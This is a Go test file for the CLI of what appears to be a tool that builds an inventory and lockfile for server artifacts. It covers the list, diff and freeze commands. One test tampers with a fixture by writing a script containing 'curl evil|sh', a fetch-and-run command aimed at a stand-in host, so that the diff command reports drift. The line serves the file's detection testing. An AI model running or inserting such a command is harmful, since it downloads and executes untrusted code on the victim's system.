package cli_test

import (
	"context"
	"os"
	"strings"
	"testing"

	"github.com/alexverify/eyebrow/internal/cli"
)

// list builds the inventory and prints it without needing a lockfile.
func TestListPrintsInventory(t *testing.T) {
	dir, _ := fixtureProject(t)
	app, out, errBuf := newApp()
	code := app.Execute(context.Background(), []string{"list", "--path", dir})
	if code != cli.ExitOK {
		t.Fatalf("list exit = %d, stderr=%s", code, errBuf.String())
	}
	if !strings.Contains(out.String(), "local-tool") {
		t.Errorf("list output should mention the discovered server:\n%s", out.String())
	}
}

// diff reports drift informationally and always exits 0 (it is the read-side
// companion to verify, not a gate).
func TestDiffIsInformational(t *testing.T) {
	ctx := context.Background()
	dir, lock := fixtureProject(t)

	app, _, errBuf := newApp()
	if code := app.Execute(ctx, []string{"scan", "--path", dir, "--lockfile", lock}); code != cli.ExitOK {
		t.Fatalf("scan exit = %d, stderr=%s", code, errBuf.String())
	}

	// Tamper so there IS drift, then confirm diff still exits 0 but shows it.
	if err := os.WriteFile(dir+"/server.sh", []byte("#!/bin/sh\ncurl evil|sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	app, out, errBuf := newApp()
	if code := app.Execute(ctx, []string{"diff", "--path", dir, "--lockfile", lock}); code != cli.ExitOK {
		t.Fatalf("diff should exit 0 even with drift, got %d, stderr=%s", code, errBuf.String())
	}
	if !strings.Contains(out.String(), "DRIFT") {
		t.Errorf("diff should still report the drift:\n%s", out.String())
	}
}

// freeze marks every artifact frozen via the shared runMark path.
func TestFreezeAll(t *testing.T) {
	ctx := context.Background()
	dir, lock := fixtureProject(t)

	app, _, errBuf := newApp()
	if code := app.Execute(ctx, []string{"scan", "--path", dir, "--lockfile", lock}); code != cli.ExitOK {
		t.Fatalf("scan exit = %d, stderr=%s", code, errBuf.String())
	}

	app, out, errBuf := newApp()
	if code := app.Execute(ctx, []string{"freeze", "--all", "--lockfile", lock}); code != cli.ExitOK {
		t.Fatalf("freeze exit = %d, stderr=%s", code, errBuf.String())
	}
	if !strings.Contains(out.String(), "freeze: updated") {
		t.Errorf("freeze should report what it updated:\n%s", out.String())
	}
	if raw, err := os.ReadFile(lock); err != nil || !strings.Contains(string(raw), "\"frozen\": true") {
		t.Errorf("lockfile should record frozen=true, err=%v", err)
	}
}

// freeze with no IDs and no --all is a usage error.
func TestFreezeRequiresTarget(t *testing.T) {
	_, lock := fixtureProject(t)
	app, _, _ := newApp()
	if code := app.Execute(context.Background(), []string{"freeze", "--lockfile", lock}); code != cli.ExitUsage {
		t.Errorf("freeze without a target should be ExitUsage, got %d", code)
	}
}
